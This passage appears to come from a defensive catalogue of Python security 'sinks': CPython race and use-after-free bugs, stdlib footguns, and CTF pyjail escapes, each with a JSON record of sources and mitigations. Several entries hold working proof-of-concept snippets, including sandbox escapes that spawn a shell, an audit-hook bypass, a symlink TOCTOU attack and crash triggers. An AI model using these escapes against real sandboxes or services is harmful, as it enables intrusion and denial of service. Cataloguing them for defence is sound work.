```python
# Attacker creates symlink during TOCTOU window
os.symlink(victim_file, lock_path)
# Victim's os.open follows symlink, truncates victim_file
```
**Refs**: GHSA-w853-jp5j-5j7f, Snyk SNYK-PYTHON-FILELOCK-14458335.

```json
{
  "sink_id": "RACE-001",
  "category": "RACE",
  "title": "`filelock` Symlink TOCTOU",
  "severity": "high",
  "affected_versions": ["filelock <3.19.1"],
  "sources": [
    {
      "type": "github_advisory",
      "url": "https://github.com/advisories/GHSA-w853-jp5j-5j7f",
      "title": "filelock has a TOCTOU Race Condition via SoftFileLock._acquire",
      "author": "GitHub",
      "date": "2025-08-04",
      "ghsa": "GHSA-w853-jp5j-5j7f",
      "verified": false,
      "tags": ["filelock", "symlink", "toctou", "race-condition"]
    },
    {
      "type": "security_advisory",
      "url": "https://security.snyk.io/vuln/SNYK-PYTHON-FILELOCK-14458335",
      "title": "TOCTOU Race Condition in filelock",
      "author": "Snyk",
      "date": "2025-08-04",
      "verified": false,
      "tags": ["filelock", "snyk", "symlink", "lockfile"]
    }
  ],
  "related_cves": ["CVE-2025-68146"],
  "related_issues": [],
  "mitigation": "Upgrade filelock and avoid following attacker-controlled symlinks during lock acquisition.",
  "confidence": "likely"
}
```

### Import System Race: Stale Module Ref (gh-143650)
**Risk**: When a module import fails, other threads can receive a stale module reference.

```python
# Thread 1: adds X to sys.modules, import fails, removes X
# Thread 2: finds X in sys.modules, returns stale reference
```
**Ref**: CPython Issue #143650.

```json
{
  "sink_id": "RACE-002",
  "category": "RACE",
  "title": "Import System Race: Stale Module Reference",
  "severity": "medium",
  "affected_versions": ["3.13+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/143650",
      "title": "Import failure can expose stale module reference to concurrent importers",
      "author": "python/cpython",
      "date": "2025-01-01",
      "gh_issue": "python/cpython#143650",
      "verified": false,
      "tags": ["import", "sys.modules", "race-condition", "threading"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#143650"],
  "mitigation": "Do not rely on partially initialized modules across threads; serialize imports when safety matters.",
  "confidence": "likely"
}
```

### `importlib.reload` Not Thread-Safe (gh-126548)
**Risk**: Concurrent reloads of the same module raise `ImportError`.

```json
{
  "sink_id": "RACE-003",
  "category": "RACE",
  "title": "`importlib.reload` Not Thread-Safe",
  "severity": "medium",
  "affected_versions": ["3.12+", "3.13+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/126548",
      "title": "importlib.reload is not thread-safe for concurrent reloads",
      "author": "python/cpython",
      "date": "2024-10-01",
      "gh_issue": "python/cpython#126548",
      "verified": false,
      "tags": ["importlib", "reload", "threading", "race-condition"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#126548"],
  "mitigation": "Guard reload operations with a process-local lock and avoid concurrent reloading of the same module.",
  "confidence": "likely"
}
```

### Asyncio `Condition.notify()` vs `Task.cancel()` (gh-112202)
**Risk**: Lost wakeups causing deadlock/starvation.

```json
{
  "sink_id": "ASYNC-001",
  "category": "ASYNC",
  "title": "Asyncio `Condition.notify()` vs `Task.cancel()` Lost Wakeup",
  "severity": "medium",
  "affected_versions": ["3.11+", "3.12+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/112202",
      "title": "asyncio Condition notify race with Task.cancel causes lost wakeups",
      "author": "python/cpython",
      "date": "2023-11-01",
      "gh_issue": "python/cpython#112202",
      "verified": false,
      "tags": ["asyncio", "condition", "cancel", "deadlock"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#112202"],
  "mitigation": "Treat cancellation around condition waits as unsafe and add higher-level retry or acknowledgement logic.",
  "confidence": "likely"
}
```

### `atexit` Re-entrant `unregister()` UAF (gh-112127)
**Risk**: `__eq__` callback calls `atexit._clear()` during iteration, freeing the callback list.

```python
import atexit
class Evil:
    def __eq__(self, other):
        atexit._clear()
        return False
atexit.unregister(Evil())  # UAF
```

```json
{
  "sink_id": "CPYTHON-001",
  "category": "CPYTHON",
  "title": "`atexit.unregister()` Re-entrant Use-After-Free",
  "severity": "high",
  "affected_versions": ["3.12+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/112127",
      "title": "Re-entrant atexit.unregister can free callback storage during iteration",
      "author": "python/cpython",
      "date": "2023-11-01",
      "gh_issue": "python/cpython#112127",
      "verified": false,
      "tags": ["atexit", "uaf", "reentrancy", "cpython"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#112127"],
  "mitigation": "Avoid attacker-controlled equality hooks in atexit unregister paths and upgrade once patched.",
  "confidence": "likely"
}
```

### `tempfile.TemporaryDirectory` Symlink Dereference (CVE-2023-6597)
**Risk**: Cleanup dereferences symlinks, potentially chmodding files outside the temp directory.

```json
{
  "sink_id": "FILE-001",
  "category": "FILE",
  "title": "`TemporaryDirectory` Cleanup Symlink Dereference",
  "severity": "medium",
  "affected_versions": ["3.8", "3.9", "3.10", "3.11", "3.12"],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-6597",
      "title": "CVE-2023-6597: tempfile.TemporaryDirectory symlink dereference during cleanup",
      "author": "NVD",
      "date": "2024-01-18",
      "cve_id": "CVE-2023-6597",
      "verified": false,
      "tags": ["tempfile", "symlink", "cleanup", "filesystem"]
    }
  ],
  "related_cves": ["CVE-2023-6597"],
  "related_issues": [],
  "mitigation": "Upgrade to a patched CPython release and avoid cleanup on attacker-controlled directory trees.",
  "confidence": "confirmed"
}
```

---

## Async / Generator Sinks

### asyncio.Task UAF via `__getattribute__` (gh-126080, gh-126138)
**Risk**: Missing incref on `task->task_context` before `call_soon` allows corruption.

```python
class Break:
    def __str__(self):
        raise RuntimeError("break")

async def target(): pass
async def main():
    task = asyncio.create_task(target())
    to_uaf = Break()
    task.__init__(target(), loop=asyncio.get_event_loop(), name=Break())
    del to_uaf
    await task  # segfault
```

```json
{
  "sink_id": "ASYNC-002",
  "category": "ASYNC",
  "title": "asyncio.Task Use-After-Free via Re-entrant Attribute Access",
  "severity": "high",
  "affected_versions": ["3.13+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/126080",
      "title": "asyncio.Task missing incref can cause UAF during call_soon path",
      "author": "python/cpython",
      "date": "2024-10-01",
      "gh_issue": "python/cpython#126080",
      "verified": false,
      "tags": ["asyncio", "task", "uaf", "segfault"]
    },
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/126138",
      "title": "Follow-up fix for asyncio.Task task_context lifetime bug",
      "author": "python/cpython",
      "date": "2024-10-01",
      "gh_issue": "python/cpython#126138",
      "verified": false,
      "tags": ["asyncio", "task", "lifetime", "call_soon"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#126080", "python/cpython#126138"],
  "mitigation": "Avoid reinitializing live Task objects and upgrade to versions with corrected reference management.",
  "confidence": "likely"
}
```

### Async Generator Concurrent Access Race (gh-117881)
**Risk**: `async_gen_athrow_throw` doesn't check `ag_running_async`, allowing concurrent access.

```json
{
  "sink_id": "ASYNC-003",
  "category": "ASYNC",
  "title": "Async Generator Concurrent Access Race",
  "severity": "medium",
  "affected_versions": ["3.11+", "3.12+", "3.13+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/117881",
      "title": "async_gen_athrow_throw missing ag_running_async check",
      "author": "python/cpython",
      "date": "2024-04-01",
      "gh_issue": "python/cpython#117881",
      "verified": false,
      "tags": ["async-generator", "race-condition", "athrow", "asyncio"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#117881"],
  "mitigation": "Do not access a single async generator concurrently from multiple tasks until patched.",
  "confidence": "likely"
}
```

### asyncio.Timeout(0) Swallows Prior Cancellation (gh-134471)
**Risk**: `asyncio.timeout(0)` catches and processes a prior unrelated cancellation.

```json
{
  "sink_id": "ASYNC-004",
  "category": "ASYNC",
  "title": "`asyncio.timeout(0)` Swallows Prior Cancellation",
  "severity": "medium",
  "affected_versions": ["3.11+", "3.12+", "3.13+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/134471",
      "title": "asyncio.timeout(0) can process an unrelated prior cancellation",
      "author": "python/cpython",
      "date": "2025-06-01",
      "gh_issue": "python/cpython#134471",
      "verified": false,
      "tags": ["asyncio", "timeout", "cancellation", "logic-bug"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#134471"],
  "mitigation": "Avoid zero-duration timeouts as cancellation boundaries in security-sensitive async control flow.",
  "confidence": "likely"
}
```

### Generator Frame `gi_frame` / Coroutine Frame `cr_frame` Bypass
**Risk**: Generator/coroutine frames expose `f_globals`/`f_builtins` for sandbox escape.

```python
foo.bar().gi_frame.f_globals['__builtins__'].exec('raise RuntimeError("hacked")')
```
**Ref**: simpleeval Issue #138.

```json
{
  "sink_id": "CTF-001",
  "category": "CTF",
  "title": "Generator and Coroutine Frame Globals Bypass",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/danthedeckie/simpleeval/issues/138",
      "title": "Sandbox bypass via gi_frame/cr_frame access in simpleeval",
      "author": "danthedeckie/simpleeval",
      "date": "2024-01-01",
      "gh_issue": "danthedeckie/simpleeval#138",
      "verified": false,
      "tags": ["sandbox-escape", "frame-object", "gi_frame", "cr_frame"]
    }
  ],
  "related_cves": [],
  "related_issues": ["danthedeckie/simpleeval#138"],
  "mitigation": "For sandboxes, block frame-object access entirely rather than only removing builtins.",
  "confidence": "likely"
}
```

---

## CTF / Sandbox Escape Sinks

### Generator Frame Traversal
**Risk**: `gi_frame.f_back.f_back.f_globals` escapes `__builtins__={}` exec context.

```python
q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])
g = [*q][0]
os = g['__builtins__']['__import__']('os')
os.system('sh')
```
**Ref**: DiceCTF 2024 IRS.

```json
{
  "sink_id": "CTF-002",
  "category": "CTF",
  "title": "Generator Frame Traversal Sandbox Escape",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://maplebacon.org/2024/02/dicectf2024-irs/",
      "title": "[DiceCTF 2024] IRS",
      "author": "Maple Bacon",
      "date": "2024-02-01",
      "verified": true,
      "tags": ["pyjail", "generator-frame", "sandbox-escape", "dicectf"]
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Block generator and frame introspection objects in jailed execution environments.",
  "confidence": "confirmed"
}
```

### Audit Hook Bypass via Signal Handler
**Risk**: Signal handlers receive a `frame` object directly, bypassing blocked `sys._getframe`.

```python
(s:=__import__('sys').modules['_signal']),
s.signal(2, lambda n,f: f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents', print)),
s.raise_signal(2)
```
**Refs**: ICTF 2024, CSAW Finals 2023.

```json
{
  "sink_id": "CTF-003",
  "category": "CTF",
  "title": "Audit Hook Bypass via Signal-Delivered Frame",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://blog.antoine.rocks/%F0%9F%91%A9%E2%80%8D%F0%9F%8F%ABwriteups/ictf%202024%20-%20all%20pyjails/",
      "title": "ICTF 2024 - All PyJails",
      "author": "Hey",
      "date": "2024-07-01",
      "verified": true,
      "tags": ["pyjail", "audit-hook", "signal", "frame"]
    },
    {
      "type": "ctf_writeup",
      "url": "https://wachter-space.de/2023/11/12/csaw23-python-jail-escape/",
      "title": "Python Jail Escape CSAW Finals 2023",
      "author": "Liam",
      "date": "2023-11-12",
      "verified": true,
      "tags": ["csaw", "audit-hook", "signal-handler", "sandbox-escape"]
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Treat signal handlers as privileged frame-introspection gadgets and disable them inside sandboxes.",
  "confidence": "confirmed"
}
```

### Decorator AST Bypass
**Risk**: Decorators compile without generating explicit `ast.Call` nodes.

```python
@exec
@input
class A: pass
# Input: import os; os.system('cat flag.txt')
```
**Refs**: HKCERT CTF 2023, b01lers CTF 2023.

```json
{
  "sink_id": "CTF-004",
  "category": "CTF",
  "title": "Decorator-Based AST Call Filter Bypass",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctf.ulis.se/writeups/b01lers2023/rev/blacklist/",
      "title": "Blacklist",
      "author": "Lombax",
      "date": "2023-03-20",
      "verified": true,
      "tags": ["decorators", "ast-bypass", "pyjail", "b01lers"]
    },
    {
      "type": "ctf_writeup",
      "url": "https://github.com/jiegec/ctf-writeups/blob/master/docs/misc/pyjail.md",
      "title": "Python Jail Escape Techniques",
      "author": "jiegec",
      "date": "2025-01-01",
      "verified": true,
      "tags": ["decorators", "hkcert", "sandbox-escape", "exec"]
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Reject decorator syntax or validate compiled bytecode/AST after lowering, not only source-level call nodes.",
  "confidence": "confirmed"
}
```

### ZIP/Polyglot File Execution
**Risk**: Python executes ZIP archives directly. EOCD comment field allows arbitrary trailing Python code.

```python
# File is both valid Python script AND valid ZIP with __main__.py
# python archive.zip executes __main__.py
```
**Ref**: UIUCTF 2025 "comments-only".

```json
{
  "sink_id": "CTF-005",
  "category": "CTF",
  "title": "ZIP/Polyglot File Execution via Python Launcher",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://github.com/jailctf/pyjail-collection",
      "title": "pyjail-collection",
      "author": "jailctf",
      "date": "2024-05-21",
      "verified": false,
      "tags": ["zip", "polyglot", "__main__", "pyjail"]
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Do not treat uploaded files as inert based solely on extension; forbid direct execution of ZIP-capable inputs.",
  "confidence": "theoretical"
}
```

### `__loader__` Access for Real Builtins
**Risk**: Import machinery bootstrap variables survive even when `__builtins__` is globally overwritten.

```python
__loader__.SourceFileLoader.get_data.__globals__["_os"].system("sh")
```
**Ref**: ALLES! CTF 2020.

```json
{
  "sink_id": "CTF-006",
  "category": "CTF",
  "title": "`__loader__` Access to Real Builtins and OS Primitives",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://github.com/ljagiello/ctf-skills/blob/main/ctf-misc/pyjails.md",
      "title": "ctf-skills pyjails.md",
      "author": "ljagiello",
      "date": "2024-01-01",
      "verified": true,
      "tags": ["__loader__", "builtins", "importlib", "sandbox-escape"]
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Remove or wrap import-loader globals when constructing restricted execution contexts.",
  "confidence": "likely"
}
```

### `dir()` Attribute Lookup Escape
**Risk**: Runtime-generated strings bypass source-code substring filters.

```python
i_class = dir([]).index('__class__')
cls = getattr([], dir([])[i_class])
```
**Ref**: InCTF 2018.

```json
{
  "sink_id": "CTF-007",
  "category": "CTF",
  "title": "`dir()`-Derived Attribute Name Filter Bypass",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://github.com/jiegec/ctf-writeups/blob/master/docs/misc/pyjail.md",
      "title": "Python Jail Escape Techniques",
      "author": "jiegec",
      "date": "2025-01-01",
      "verified": true,
      "tags": ["dir", "string-bypass", "attribute-access", "pyjail"]
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Do not rely on source substring deny-lists; enforce runtime capability restrictions.",
  "confidence": "likely"
}
```

### Bytecode OOB Read via `LOAD_FAST`
**Risk**: CPython doesn't validate opcode indices against actual tuple sizes.

```python
from opcode import opmap
import types

code = bytes([opmap["LOAD_FAST"], 51])  # index beyond co_names
codeobj = types.CodeType(0, 0, 0, 0, 0, 0, code, (), (), (), '', '', '', 0, b'', b'', (), ())
```
**Ref**: TSG CTF 2023 "bypy".

```json
{
  "sink_id": "CPYTHON-002",
  "category": "CPYTHON",
  "title": "Bytecode Out-of-Bounds Read via Forged `LOAD_FAST`",
  "severity": "high",
  "affected_versions": ["3.11", "3.12"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://github.com/jailctf/pyjail-collection",
      "title": "pyjail-collection",
      "author": "jailctf",
      "date": "2024-05-21",
      "verified": false,
      "tags": ["bytecode", "oob-read", "load_fast", "cpython"]
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Block attacker-controlled code object construction and validate bytecode invariants before execution.",
  "confidence": "likely"
}
```

---

## Stdlib Hidden Sinks

### `ast.literal_eval` — Not Truly Safe
**Risk**: C stack exhaustion and memory exhaustion.

```python
import ast
ast.literal_eval('(' * 1000 + '0' + ',)' * 1000)  # Crash
```
**Ref**: CPython Issue #95588.

```json
{
  "sink_id": "STDLIB-001",
  "category": "STDLIB",
  "title": "`ast.literal_eval` Denial of Service",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/95588",
      "title": "ast.literal_eval is not safe against resource exhaustion",
      "author": "python/cpython",
      "date": "2022-08-01",
      "gh_issue": "python/cpython#95588",
      "verified": false,
      "tags": ["ast", "literal_eval", "dos", "stack-exhaustion"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#95588"],
  "mitigation": "Do not run literal_eval on untrusted input without strict size and recursion limits.",
  "confidence": "confirmed"
}
```

### `ctypes` Buffer Overflow (CVE-2021-3177)
**Risk**: `c_double.from_param(1e300)` overflows internal buffer.

```python
from ctypes import c_double
c_double.from_param(1e300)  # buffer overflow
```
**Ref**: CPython Issue #42938.

```json
{
  "sink_id": "STDLIB-002",
  "category": "STDLIB",
  "title": "`ctypes` `c_double.from_param` Buffer Overflow",
  "severity": "critical",
  "affected_versions": ["3.6", "3.7", "3.8", "3.9"],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3177",
      "title": "CVE-2021-3177: ctypes buffer overflow in PyCArg_repr / c_double.from_param",
      "author": "NVD",
      "date": "2021-02-15",
      "cve_id": "CVE-2021-3177",
      "verified": false,
      "tags": ["ctypes", "buffer-overflow", "memory-corruption", "float"]
    },
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/42938",
      "title": "ctypes buffer overflow with large float formatting",
      "author": "python/cpython",
      "date": "2021-01-16",
      "gh_issue": "python/cpython#42938",
      "verified": false,
      "tags": ["ctypes", "cpython", "overflow", "security-fix"]
    }
  ],
  "related_cves": ["CVE-2021-3177"],
  "related_issues": ["python/cpython#42938"],
  "mitigation": "Upgrade CPython and avoid exposing ctypes conversion helpers to untrusted values.",
  "confidence": "confirmed"
}
```

### `http.server` — Multiple Issues
**Risk**: Open redirection (CVE-2021-28861), path disclosure, CGI OOM on Windows.

```json
{
  "sink_id": "STDLIB-003",
  "category": "STDLIB",
  "title": "`http.server` Multi-Issue Exposure",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-28861",
      "title": "CVE-2021-28861: open redirection in Python http.server",
      "author": "NVD",
      "date": "2021-02-10",
      "cve_id": "CVE-2021-28861",
      "verified": false,
      "tags": ["http.server", "open-redirect", "cgi", "disclosure"]
    }
  ],
  "related_cves": ["CVE-2021-28861"],
  "related_issues": [],
  "mitigation": "Do not expose http.server to untrusted clients; use a production-hardened HTTP stack instead.",
  "confidence": "confirmed"
}
```

### `os.path.commonprefix` — Deprecated Due to Security
**Risk**: Returns common prefix character-by-character, not path-aware. Used insecurely in tarfile filters.

```python
os.path.commonprefix(['/home/user/file', '/home/user/subdir'])
# Returns '/home/user/s' — not a valid path!
```
**Ref**: Seth Larson deprecation proposal.

```json
{
  "sink_id": "FILE-002",
  "category": "FILE",
  "title": "`os.path.commonprefix` Path Validation Footgun",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://sethmlarson.dev/security/deprecating-os-path-commonprefix-python-3-13",
      "title": "Deprecating os.path.commonprefix in Python 3.13 for security reasons",
      "author": "Seth Michael Larson",
      "date": "2024-06-01",
      "verified": false,
      "tags": ["commonprefix", "path-traversal", "tarfile", "deprecation"]
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Use os.path.commonpath or canonicalized path comparisons instead of commonprefix.",
  "confidence": "likely"
}
```

### `subprocess` on Windows with Batch Files
**Risk**: Acts like `shell=True` even with `shell=False` when executing `.bat` files.

```python
subprocess.check_output(["C:/testscript.bat", "foo", "&&", "echo", "%PROGRAMFILES%"])
# && and %VAR% interpreted as shell metacharacters
```
**Ref**: Python Issue #33515.

```json
{
  "sink_id": "STDLIB-004",
  "category": "STDLIB",
  "title": "Windows Batch Files Behave Like `shell=True` in `subprocess`",
  "severity": "high",
  "affected_versions": ["3.x on Windows"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/33515",
      "title": "subprocess on Windows executes .bat files with shell semantics",
      "author": "python/cpython",
      "date": "2018-05-01",
      "gh_issue": "python/cpython#33515",
      "verified": false,
      "tags": ["subprocess", "windows", "batch", "command-injection"]
    }
  ],
  "related_cves": [],
  "related_issues": ["python/cpython#33515"],
  "mitigation": "Avoid passing untrusted arguments to .bat/.cmd targets; wrap with explicit escaping or avoid batch files entirely.",
  "confidence": "confirmed"
}
```

### `re` Module — Catastrophic Backtracking
**Risk**: Exponential backtracking in regex patterns. CVE-2024-6232 affects tarfile header parsing.

```python
import re
pattern = re.compile(r'(a+)+$')
pattern.match('a' * 30 + '!')  # CPU 100%
```

```json
{
  "sink_id": "STDLIB-005",
  "category": "STDLIB",
  "title": "Catastrophic Backtracking in `re` Consumers",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-6232",
      "title": "CVE-2024-6232: tarfile header parsing vulnerable to ReDoS",
      "author": "NVD",
      "date": "2024-07-01",
      "cve_id": "CVE-2024-6232",
      "verified": false,
      "tags": ["regex", "redos", "tarfile", "backtracking"]
    }
  ],
  "related_cves": ["CVE-2024-6232"],
  "related_issues": [],
  "mitigation": "Avoid backtracking-prone regexes on untrusted input and prefer linear-time parsers for archive metadata.",
  "confidence": "confirmed"
}
```

---
